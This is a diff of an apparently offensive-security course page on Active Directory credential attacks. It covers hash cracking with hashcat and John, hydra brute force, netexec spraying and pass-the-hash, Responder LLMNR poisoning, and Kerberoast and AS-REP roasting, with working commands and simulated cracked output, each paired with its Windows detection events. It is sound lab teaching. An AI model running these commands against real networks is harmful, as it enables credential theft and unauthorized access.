+        <p class="atk-cap"><b>The hash IS the credential.</b> This is the whole reason a strong password does not save a machine whose hash is stolen. Lab 6.</p>
+        </div>
+        </figure>
 
       <h2><span class="h-t">The hash-cracking pipeline</span></h2>
       <p>Every offline crack is the same four steps. Get any one wrong (usually the mode) and it silently fails.</p>
@@ -1229,6 +1519,11 @@ nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / n
            helpers. Learn the method once; it's identical.</p>
       </div>
 
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="7" y="9" width="18" height="14" rx="2.5"/><path d="M11 9V6M16 9V6M21 9V6M11 23v3M16 23v3M21 23v3M7 13H4M7 19H4M25 13h3M25 19h3"/><path d="M17.5 11l-4 5.5h3.2l-2.7 4.5" fill="#ff7043" stroke-width="1"/></svg></span><span class="tool-id"><span class="tool-name">hashcat</span><span class="tool-tag">GPU offline cracker</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>Recover the plaintext behind a stolen hash at GPU speed &mdash; no lockout, no rate limit, nothing logged on the target.</p><p><span class="tm-k">Reach for it</span>The instant you hold a hash &mdash; a SAM/NTDS dump, a Responder capture, a Kerberoast or AS-REP ticket.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener">TryHackMe &mdash; Crack The Hash</a></p></div>
+      </div>
+
       <h2 class="mono" style="color:#ff7043"><span class="h-t">hashcat — the 7-part frame</span></h2>
       <div class="tbl-scroll">
       <table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
@@ -1243,7 +1538,7 @@ hashcat -m 18200 asrep.txt rockyou.txt                    # AS-REP roast
 hashcat -m 1000  sam.txt --show                           # print cracked results</code></pre></td></tr>
           <tr><td><strong>Read the output</strong></td><td>Each cracked line prints <span class="mono">hash:plaintext</span>. <span class="mono">Status: Cracked</span> = done; <span class="mono">Exhausted</span> = the wordlist ran out without a match (not "uncrackable" — try rules or a bigger list).</td></tr>
           <tr><td><strong>What it feeds</strong></td><td>The "credentials obtained + how" column of the access plan.</td></tr>
-          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">None on the target.</span> Offline cracking happens on <em>your</em> box — the victim never sees it. The detectable event was <em>earlier</em>: how you got the hash (a SAM dump, a Kerberoast 4769, a Responder capture). That's the lesson — you detect the theft, never the crack.</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">None on the target.</span> Offline cracking happens on <em>your</em> box — the victim never sees it. The detectable event was <em>earlier</em>: how you got the hash (a SAM dump, a Kerberoast 4769, a Responder capture). That's the lesson — <strong class="hl hl-d">you detect the theft, never the crack</strong>.</td></tr>
         </tbody>
       </table>
       </div>
@@ -1259,6 +1554,11 @@ hashcat -m 1000  sam.txt --show                           # print cracked result
           <tr><td class="mono">18200</td><td>Kerberos 5 AS-REP (RC4)</td><td>AS-REP roast (GetNPUsers) — Lab 6</td></tr>
         </tbody>
       </table>
+      </div>
+
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="12" r="5.5"/><circle cx="11" cy="12" r="1.6" fill="#ff7043" stroke="none"/><path d="M15 16l9 9M21 22l2.5-2.5M24 25l2.5-2.5"/></svg></span><span class="tool-id"><span class="tool-name">John</span><span class="tool-tag">CPU cracker + *2john helpers</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>The same offline cracking, CPU-first, with format auto-detection and the <span class="mono">*2john</span> helpers that turn files (zip, ssh, keepass) into crackable hashes.</p><p><span class="tm-k">Reach for it</span>No GPU handy, an unknown hash format, or an artefact you must convert to a hash before cracking.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/crackthehash" target="_blank" rel="noopener">TryHackMe &mdash; Crack The Hash</a></p></div>
       </div>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">John the Ripper (jumbo) — the same job, CPU-first</span></h2>
@@ -1412,6 +1712,11 @@ john --show unshadowed.txt          # → msfadmin:msfadmin , user:user ...</cod
            technique built specifically to slip between them.</p>
       </div>
 
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="19" y="13" width="10" height="9" rx="1.5"/><path d="M21.5 13v-2.2a2.5 2.5 0 015 0V13"/><path d="M3 8h12M3 16h12M3 24h12"/><path d="M15 8l-2.5-2.2M15 8l-2.5 2.2M15 16l-2.5-2.2M15 16l-2.5 2.2M15 24l-2.5-2.2M15 24l-2.5 2.2"/></svg></span><span class="tool-id"><span class="tool-name">hydra</span><span class="tool-tag">online login brute-forcer</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>Test a live login directly when you cannot get the hash &mdash; many protocols (SSH, RDP, SMB, HTTP forms), at speed.</p><p><span class="tm-k">Reach for it</span>A reachable service + a known user + a small, targeted list. Go wide and you trip the lockout &mdash; prefer spraying.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">TryHackMe &mdash; Attacktive Directory (free)</a></p></div>
+      </div>
+
       <h2 class="mono" style="color:#ff7043"><span class="h-t">hydra — the 7-part frame</span></h2>
       <div class="tbl-scroll">
       <table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
@@ -1427,6 +1732,11 @@ hydra -l admin -P pass; medusa -h host -u user -P list -M ssh   # medusa = the s
           <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Very loud.</span> Every attempt is a failed-logon event (Windows <span class="mono">4625</span>). A burst from one source is the clearest attack signal there is — which is exactly why brute-force barely works against a monitored, lockout-protected domain, and why spraying exists.</td></tr>
         </tbody>
       </table>
+      </div>
+
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="9" r="2.6"/><circle cx="19" cy="9" r="2.6"/><circle cx="8" cy="20" r="2.6"/><path d="M10.6 9H16.4M8 11.6v5.8"/><path d="M15 23l3 3 6.5-7.5"/></svg></span><span class="tool-id"><span class="tool-name">netexec</span><span class="tool-tag">spray &amp; pass-the-hash at scale</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>Validate one credential (or hash) across many hosts or many accounts over SMB/WinRM/LDAP &mdash; the domain spray &amp; pass-the-hash tool.</p><p><span class="tm-k">Reach for it</span>Spraying a domain, checking where a cred works, or authenticating with a hash instead of a password.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">TryHackMe &mdash; Attacktive Directory (free)</a></p></div>
       </div>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">netexec (nxc) — spraying &amp; pass-the-hash at scale</span></h2>
@@ -1451,7 +1761,7 @@ nxc smb 192.168.56.0/24 -u a.fahmy -p 'Autumn2025!'                          # w
           <path d="M660,63 L758,63" stroke="#4ade80" stroke-width="1.8" marker-end="url(#ar-grn)"/>
           <text class="d-sub" x="705" y="112" text-anchor="middle" fill="#4ade80">one attempt per account never reaches the threshold — it only takes one reuse</text>
         </svg>
-        <figcaption><b>Invert the loop.</b> Brute-force is many-passwords-one-account (locks fast); spraying is
+        <figcaption><b class="hl">Invert the loop.</b> Brute-force is many-passwords-one-account (locks fast); spraying is
            one-password-many-accounts (slips under lockout). Same tool, opposite blast radius.</figcaption>
       </figure>
       <div class="sim" data-animate="">
@@ -1529,7 +1839,7 @@ EOF</code></pre>
           <div class="sim sim-evt">
   <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">Event Viewer — Windows Logs &#9656; Security</span><span class="sim-tool">DC01 · ceh.lab</span></div>
   <div class="sim-body">
-    <table><thead><tr><th>Level</th><th>Date and Time</th><th>Event ID</th><th>Account</th><th>Source IP</th></tr></thead>
+    <table><colgroup><col style="width:21%"><col style="width:29%"><col style="width:14%"><col style="width:15%"><col style="width:21%"></colgroup><thead><tr><th>Level</th><th>Date and Time</th><th>Event ID</th><th>Account</th><th>Source IP</th></tr></thead>
     <tbody>
       <tr class="hlrow"><td class="lvl-f">Audit Failure</td><td>09/09/2026 14:22:03</td><td class="k">4625</td><td>a.fahmy</td><td>192.168.56.50</td></tr>
       <tr class="hlrow"><td class="lvl-f">Audit Failure</td><td>09/09/2026 14:22:03</td><td class="k">4625</td><td>n.gamal</td><td>192.168.56.50</td></tr>
@@ -1571,7 +1881,7 @@ EOF</code></pre>
   <!-- ==========  P19 · LLMNR POISONING + RESPONDER  ========== -->
   <section class="page" data-title="LLMNR/NBT-NS poisoning">
     <div class="page-head">
-      <div class="kicker"><span class="snum">S04 · P19</span><span class="tag theory">Method · the one diagram</span><span class="time">⏱ 8 min</span></div>
+      <div class="kicker"><span class="snum">S04 · P19</span><span class="tag theory">Method · step through</span><span class="time">⏱ 8 min</span></div>
       <h1>Poisoning a Broadcast the Whole Network Trusts</h1>
       <p class="lede">When name resolution falls back to a broadcast, whoever answers first wins — and Responder always
          answers first.</p>
@@ -1586,45 +1896,66 @@ EOF</code></pre>
            joined in Session 3.</p>
       </div>
 
-      <h2><span class="h-t">How it works — one picture</span></h2>
-      <figure class="dgm">
-        <svg viewBox="0 0 1560 470" role="img" aria-label="LLMNR poisoning sequence: a victim DNS lookup fails, the victim broadcasts an LLMNR query, the attacker answers first, the victim authenticates to the attacker and its NetNTLMv2 is captured for offline cracking.">
-  <rect x="40" y="28" width="340" height="70" rx="9" fill="#1f2533" stroke="#22d3ee"></rect>
-  <text class="d-title" x="210" y="58" text-anchor="middle" font-size="18">Victim (Win10)</text>
-  <text class="d-lbl" x="210" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">mistypes <tspan class="d-mono">\\fileshart</tspan></text>
-  <rect x="610" y="28" width="340" height="70" rx="9" fill="#1f2533" stroke="#4ade80"></rect>
-  <text class="d-title" x="780" y="58" text-anchor="middle" font-size="18">DNS (the DC)</text>
-  <text class="d-lbl" x="780" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">has no such name</text>
-  <rect x="1180" y="28" width="340" height="70" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
-  <text class="d-title" x="1350" y="58" text-anchor="middle" font-size="17" fill="#ff7043">Attacker (Responder)</text>
-  <text class="d-lbl" x="1350" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">listening on the LAN</text>
-  <line x1="210" y1="98" x2="210" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
-  <line x1="780" y1="98" x2="780" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
-  <line x1="1350" y1="98" x2="1350" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
-  <!-- 1 -->
-  <text class="d-mono" x="495" y="142" text-anchor="middle" font-size="15" fill="#a0aab6">1 · DNS lookup: who is \\fileshart?</text>
-  <path class="flow-line" d="M214,154 L776,154" fill="none" stroke="#768290" stroke-width="1.7" marker-end="url(#ar-g)"></path>
-  <!-- 2 -->
-  <text class="d-mono" x="495" y="196" text-anchor="middle" font-size="15" fill="#e63946">2 · NXDOMAIN — not found</text>
-  <path class="flow-line" d="M776,208 L214,208" fill="none" stroke="#e63946" stroke-width="1.7" marker-end="url(#ar-r)"></path>
-  <!-- 3 broadcast -->
-  <text class="d-mono" x="780" y="250" text-anchor="middle" font-size="15" fill="#fbbf24">3 · LLMNR broadcast to the WHOLE segment: “who is fileshart?”</text>
-  <path class="flow-line" d="M214,262 L1346,262" fill="none" stroke="#fbbf24" stroke-width="1.7" marker-end="url(#ar-am)"></path>
-  <!-- 4 -->
-  <text class="d-mono" x="780" y="304" text-anchor="middle" font-size="15" fill="#ff7043">4 · “that's me!” — Responder answers first</text>
-  <path class="flow-line" d="M1346,316 L214,316" fill="none" stroke="#ff7043" stroke-width="1.8" marker-end="url(#ar-o)"></path>
-  <!-- 5 -->
-  <text class="d-mono" x="780" y="358" text-anchor="middle" font-size="15" fill="#ff7043">5 · victim authenticates → sends NetNTLMv2 response</text>
-  <path class="flow-line" d="M214,370 L1346,370" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"></path>
-  <!-- 6 capture band -->
-  <path d="M1350,392 L1350,410" fill="none" stroke="#e63946" stroke-width="1.5" marker-end="url(#ar-r)"></path>
-  <rect x="1020" y="412" width="500" height="42" rx="8" fill="#1a1f2a" stroke="#e63946"></rect>
-  <text class="d-mono" x="1270" y="439" text-anchor="middle" font-size="15" fill="#e63946">6 · captured → crack offline (hashcat -m 5600)</text>
-</svg>
-        <figcaption><b>Whoever answers first wins.</b> LLMNR/NBT-NS have no authentication — the victim believes the first
-           reply. Responder's whole job is to be that reply, harvesting NetNTLMv2 responses from every workstation that
-           mistypes a share or looks up a name that doesn't resolve.</figcaption>
+      <h2><span class="h-t">How it works — step through the poisoning</span></h2>
+      <figure class="dgm pktflow">
+        <svg viewBox="0 0 1040 404" role="img" aria-label="LLMNR poisoning stepped sequence across victim, DNS/DC and attacker: DNS lookup fails, the victim broadcasts an LLMNR query to the whole segment, the attacker answers first, the victim authenticates to the attacker, and its NetNTLMv2 is captured for offline cracking.">
+          <rect x="55" y="34" width="190" height="52" rx="9" fill="var(--panel-2)" stroke="var(--cyan)"/>
+          <text class="d-title" x="150" y="58" text-anchor="middle" font-size="14">Victim · Win10</text>
+          <text class="d-sub" x="150" y="76" text-anchor="middle">mistypes \\fileshart</text>
+          <rect x="425" y="34" width="190" height="52" rx="9" fill="var(--panel-2)" stroke="var(--green)"/>
+          <text class="d-title" x="520" y="58" text-anchor="middle" font-size="14" fill="var(--green)">DNS · the DC</text>
+          <text class="d-sub" x="520" y="76" text-anchor="middle">has no such name</text>
+          <rect x="795" y="34" width="190" height="52" rx="9" fill="var(--panel)" stroke="var(--orange)"/>
+          <text class="d-title" x="890" y="58" text-anchor="middle" font-size="13.5" fill="var(--orange)">Attacker · Responder</text>
+          <text class="d-sub" x="890" y="76" text-anchor="middle">listening on the LAN</text>
+          <line x1="150" y1="86" x2="150" y2="330" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="520" y1="86" x2="520" y2="330" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <line x1="890" y1="86" x2="890" y2="330" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+            <text x="335" y="120" font-size="12.5" class="d-sub" text-anchor="middle" font-weight="600" fill="var(--text-2)">1 · DNS lookup: who is \\fileshart?</text>
+            <path d="M156,134 L514,134" fill="none" stroke="var(--text-3)" stroke-width="2" marker-end="url(#ar-g)"/>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:26px">
+            <text x="335" y="164" font-size="12.5" text-anchor="middle" font-weight="600" fill="var(--red)">2 · NXDOMAIN — not found</text>
+            <path d="M514,178 L156,178" fill="none" stroke="var(--red)" stroke-width="2" marker-end="url(#ar-r)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+            <text x="520" y="208" font-size="12.5" text-anchor="middle" font-weight="700" fill="var(--amber)">3 · LLMNR broadcast to the WHOLE segment</text>
+            <path d="M156,222 L884,222" fill="none" stroke="var(--amber)" stroke-width="2" marker-end="url(#ar-am)"/>
+          </g>
+          <g class="pf-step" data-step="4" style="--pf-dx:26px">
+            <text x="520" y="252" font-size="12.5" text-anchor="middle" font-weight="700" fill="var(--orange)">4 · "that's me!" — Responder answers FIRST</text>
+            <path d="M884,266 L156,266" fill="none" stroke="var(--orange)" stroke-width="2.2" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="5" style="--pf-dx:-26px">
+            <text x="520" y="296" font-size="12.5" text-anchor="middle" font-weight="700" fill="var(--orange)">5 · victim authenticates → sends NetNTLMv2</text>
+            <path d="M156,310 L884,310" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="6" style="--pf-dx:26px">
+            <path d="M890,314 L890,344" fill="none" stroke="var(--red)" stroke-width="1.6" stroke-dasharray="5 4" marker-end="url(#ar-r)"/>
+            <rect x="560" y="348" width="440" height="42" rx="8" fill="var(--panel)" stroke="var(--red)"/>
+            <text x="780" y="374" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--red)">6 · captured → crack offline, hashcat -m 5600</text>
+          </g>
+        </svg>
+        <div class="pf-ctl">
+          <button type="button" data-pf="prev">&#8249; Back</button>
+          <button type="button" data-pf="play">&#9654; Play</button>
+          <button type="button" data-pf="next">Next &#8250;</button>
+          <span class="pf-count"></span>
+        </div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The victim tries to resolve a name — here a <b>mistyped share</b>. Windows asks DNS first.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>DNS (the DC) has no such record and returns <b>NXDOMAIN</b>. On its own, completely harmless.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Windows falls back to an <b class="hl hl-w">unauthenticated LLMNR/NBT-NS broadcast</b> to the whole segment: "does anyone know this name?" Nobody legitimate does.</div>
+        <div class="pf-cap" data-cap="4"><span class="pf-n">STEP 4 · where it bleeds</span>Responder answers first, claiming to be the host. LLMNR has <b>no authentication</b> — the victim believes the first reply it hears.</div>
+        <div class="pf-cap" data-cap="5"><span class="pf-n">STEP 5</span>The victim now "authenticates" to the attacker and sends its <b>NetNTLMv2</b> response — thinking it's talking to a real file server.</div>
+        <div class="pf-cap" data-cap="6"><span class="pf-n">STEP 6</span>Responder logs the NetNTLMv2 → crack offline (<span class="mono">-m 5600</span>) or <b>relay</b> it live. No password was ever needed to start.</div>
+        <figcaption><b class="hl hl-w">Whoever answers first wins.</b> LLMNR/NBT-NS have no authentication — Responder's whole job is to be that first reply, harvesting NetNTLMv2 from every workstation that mistypes a share or looks up a name that doesn't resolve.</figcaption>
       </figure>
+
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="10" cy="16" r="3" fill="#ff7043" stroke="none"/><path d="M16 11a7 7 0 010 10M20 8a11.5 11.5 0 010 16"/><path d="M6 11L3.5 8M6 21l-2.5 3"/></svg></span><span class="tool-id"><span class="tool-name">Responder</span><span class="tool-tag">LLMNR/NBT-NS poisoner</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>Harvest NetNTLMv2 by answering the broadcast name lookups Windows still trusts &mdash; a credential with no starting foothold.</p><p><span class="tm-k">Reach for it</span>You are on the LAN with no credential yet. Turn it on and wait for a mistyped share or a failed name lookup.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">TryHackMe &mdash; Attacktive Directory (free)</a></p></div>
+      </div>
 
       <h2 class="mono" style="color:#ff7043"><span class="h-t">Responder — the 7-part frame</span></h2>
       <div class="tbl-scroll">
@@ -1756,6 +2087,11 @@ hashcat -m 5600 netntlm.txt --show</code></pre>
            tilts. And pass-the-hash shows that a strong password doesn't save a machine whose hash has leaked.</p>
       </div>
 
+      <div class="toolcard" data-accent="orange">
+        <div class="tool-badge"><span class="tool-ico"><svg viewBox="0 0 32 32" fill="none" stroke="#ff7043" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="7" width="20" height="5.5" rx="1.5"/><rect x="6" y="14.5" width="20" height="5.5" rx="1.5"/><rect x="6" y="22" width="20" height="5.5" rx="1.5"/><circle cx="10" cy="9.75" r="1.1" fill="#ff7043" stroke="none"/><circle cx="10" cy="17.25" r="1.1" fill="#ff7043" stroke="none"/><circle cx="10" cy="24.75" r="1.1" fill="#ff7043" stroke="none"/></svg></span><span class="tool-id"><span class="tool-name">Impacket</span><span class="tool-tag">Kerberos/SMB/MSRPC toolkit</span></span></div>
+        <div class="tool-meta"><p><span class="tm-k">Goal</span>Speak Kerberos/SMB/MSRPC from Linux &mdash; roast tickets, dump NTDS, and exec commands with one domain credential.</p><p><span class="tm-k">Reach for it</span>You hold one valid domain cred and want to Kerberoast, AS-REP roast, secretsdump, or get a SYSTEM shell.</p><p><span class="tm-k">Practice</span><a href="https://tryhackme.com/room/attacktivedirectory" target="_blank" rel="noopener">TryHackMe &mdash; Attacktive Directory (free)</a></p></div>
+      </div>
+
       <h2 class="mono" style="color:#ff7043"><span class="h-t">Impacket — the 7-part frame</span></h2>
       <div class="tbl-scroll">
       <table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
@@ -1790,7 +2126,7 @@ impacket-psexec       ceh.lab/m.said@192.168.56.20                    # SYSTEM s
           <path d="M560,44 C640,52 660,74 698,88" fill="none" stroke="#768290" stroke-width="1.4" marker-end="url(#ar-g)"/>
           <path d="M560,144 C640,136 660,116 698,104" fill="none" stroke="#a78bfa" stroke-width="1.6" marker-end="url(#ar-pu)"/>
         </svg>
-        <figcaption><b>Cracking is optional.</b> The lower path (T1550.002) skips it entirely — which is why a 30-character
+        <figcaption><b class="hl">Cracking is optional.</b> The lower path (T1550.002) skips it entirely — which is why a 30-character
            service-account password is no comfort once its NT hash leaks from the NTDS.</figcaption>
       </figure>
 
@@ -1809,8 +2145,8 @@ impacket-psexec       ceh.lab/m.said@192.168.56.20                    # SYSTEM s
     <div class="page-head">
       <div class="kicker"><span class="snum">S04 · P22</span><span class="tag lab">Hands-on · everyone · generates evidence</span><span class="time">⏱ 15 min</span></div>
       <h1>Lab 6 — Kerberoast, and the Ticket That Won't Crack</h1>
-      <p class="lede">Request a service ticket with a low-priv account, crack the service account's password offline, and
-         generate the 4769 evidence — then meet the honest failure case.</p>
+      <p class="lede">Request a service ticket with a low-priv account, crack the service account's password offline,
+         AS-REP roast a no-pre-auth account with no credential at all, generate the 4768/4769 evidence — then meet the honest failure case.</p>
     </div>
     <div class="content">
 
@@ -1875,7 +2211,39 @@ hashcat -m 13100 spn.txt --show    # → svc_backup:&lt;its weak password&gt;</c
         </li>
       </ol>
 
-      <h2><span class="h-t">Step 3 — the honest failure case</span></h2>
+      <h2><span class="h-t">Step 3 — AS-REP roast the account with no pre-auth</span></h2>
+      <ol class="steps">
+        <li>
+          <strong>Ask for an AS-REP without any password.</strong> An account with "Do not require Kerberos
+          pre-authentication" set (<span class="mono">svc_legacy</span>, seeded by
+          <span class="mono">lab_s4_dc_setup.ps1 -Stage ASREPRoast</span>) hands its encrypted blob to <em>anyone</em>.
+          <pre><code>impacket-GetNPUsers -dc-ip 192.168.56.10 ceh.lab/ -usersfile users.txt -no-pass -format hashcat
+# ceh.lab\svc_legacy  →  $krb5asrep$23$svc_legacy@CEH.LAB:1f8c...   ( NO credential was used )
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code></pre>
+          <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">impacket · GetNPUsers</span></div>
+  <div class="sim-body">
+<span class="l cmd root">impacket-GetNPUsers ceh.lab/ -usersfile users.txt -no-pass -format hashcat -dc-ip 10.10.0.10</span>
+<span class="l dim">[*] Getting TGT for each user (no pre-auth required)</span>
+<span class="l warn">[-] user 'j.doe' has pre-auth set, skipping</span>
+<span class="l">$krb5asrep$23$<b>svc_legacy</b>@CEH.LAB:9c1e...  <span class="dim">← AS-REP, mode 18200</span></span>
+<span class="l cmd root">hashcat -m 18200 asrep.txt rockyou.txt</span>
+<span class="l">svc_legacy:<span class="hl">Welcome1</span>  <span class="crit">← cracked with ZERO starting credentials</span></span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>No credential needed to request it</b> — only pre-auth-disabled accounts are roastable.</span></div>
+</div>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>You got a <span class="mono">$krb5asrep$23$</span> hash for <span class="mono">svc_legacy</span> — with <strong>no starting credential</strong></li>
+              <li>It cracked at <span class="mono">-m 18200</span> (not 13100 — different Kerberos artefact, different mode)</li>
+              <li>The DC logged <span class="mono">4768</span> with <strong>pre-auth type 0</strong> — the AS-REP-roast evidence for Lab 7</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2><span class="h-t">Step 4 — the honest failure case</span></h2>
       <div class="box warn">
         <span class="box-t">The ticket that never cracks</span>
         <p><span class="mono">svc_sql</span> was seeded with a long random password. Its ticket roasts exactly the same
@@ -1885,7 +2253,7 @@ hashcat -m 13100 spn.txt --show    # → svc_backup:&lt;its weak password&gt;</c
            "roastable, not cracked (strong password)."</p>
       </div>
 
-      <h2><span class="h-t">Step 4 — you don't always need to crack (pass-the-hash + a shell)</span></h2>
+      <h2><span class="h-t">Step 5 — you don't always need to crack (pass-the-hash + a shell)</span></h2>
       <ol class="steps">
         <li>
           <strong>Use a dumped hash directly</strong>, and get an interactive shell with a working credential.
@@ -1927,51 +2295,84 @@ evil-winrm -i 192.168.56.20 -u svc_backup -p '&lt;cracked&gt;'  # interactive Po
            wire — which is exactly what you're about to prove in Lab 7.</p>
       </div>
 
-      <figure class="dgm">
-        <svg viewBox="0 0 940 300" role="img" aria-label="Attacker action on the left in orange paired with the defender's log evidence on the right in green, for password spraying, Kerberoasting, and LLMNR poisoning.">
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 452" role="img" aria-label="Interactive attacker-to-log map: five attacks in orange on the left, each paired with the defender's Windows event on the right in green — password spray to 4625, Kerberoast to 4769, AS-REP roast to 4768, LLMNR poison to network/EDR detection, pass-the-hash to 4624 logon type 3. Click each attack.">
           <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACKER did</text>
           <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees</text>
-          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <line x1="470" y1="40" x2="470" y2="438" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
           <!-- row 1 spray -->
-          <rect x="20" y="48" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-lbl" x="38" y="72" font-size="12">Password spray (Lab 4)</text>
-          <text class="d-sub" x="38" y="92">1 password → many accounts, one source</text>
-          <text class="d-sub" x="38" y="107" class="d-mono">nxc smb DC -u users.txt -p '...'</text>
-          <rect x="490" y="48" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
-          <text class="d-lbl" x="508" y="72" font-size="12" fill="#4ade80" class="d-mono">4625</text>
-          <text class="d-sub" x="560" y="72">failed logons, many users, short window</text>
-          <text class="d-sub" x="508" y="92">+ <tspan class="d-mono">4771/4768</tspan> pre-auth failures (status 0x18)</text>
-          <text class="d-sub" x="508" y="107">the one-to-many signature → your rule</text>
-          <path d="M450,81 L488,81" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="lg-spray" tabindex="0">
+            <rect x="20" y="44" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-lbl" x="38" y="70" font-size="12">Password spray · Lab 4</text>
+            <text class="d-sub" x="38" y="90">1 password → many accounts, one source</text>
+            <text class="d-sub" x="38" y="105" class="d-mono">nxc smb DC -u users.txt -p '...'</text>
+          </g>
+          <rect x="490" y="44" width="430" height="66" rx="8" fill="#12241c" stroke="#4ade80"/>
+          <text class="d-lbl" x="508" y="72" font-size="13" fill="#4ade80" class="d-mono">4625</text>
+          <text class="d-sub" x="566" y="72">failed logons, many users, short window</text>
+          <text class="d-sub" x="508" y="95">+ <tspan class="d-mono">4771/4768</tspan> pre-auth failures (status 0x18)</text>
+          <path d="M450,77 L488,77" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
           <!-- row 2 kerberoast -->
-          <rect x="20" y="126" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-lbl" x="38" y="150" font-size="12">Kerberoast (Lab 6)</text>
-          <text class="d-sub" x="38" y="170">request service tickets for every SPN</text>
-          <text class="d-sub" x="38" y="185" class="d-mono">impacket-GetUserSPNs -request</text>
-          <rect x="490" y="126" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#4ade80"/>
-          <text class="d-lbl" x="508" y="150" font-size="12" fill="#4ade80" class="d-mono">4769</text>
-          <text class="d-sub" x="560" y="150">service-ticket requests, one user, many SPNs</text>
-          <text class="d-sub" x="508" y="170">encryption type <tspan class="d-mono">0x17</tspan> (RC4) = the tell</text>
-          <text class="d-sub" x="508" y="185">AS-REP roast shows as <tspan class="d-mono">4768</tspan></text>
-          <path d="M450,159 L488,159" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
-          <!-- row 3 llmnr -->
-          <rect x="20" y="204" width="430" height="66" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-lbl" x="38" y="228" font-size="12">LLMNR poison (Lab 5)</text>
-          <text class="d-sub" x="38" y="248">answer a broadcast, capture NetNTLMv2</text>
-          <text class="d-sub" x="38" y="263" class="d-mono">responder -I eth0</text>
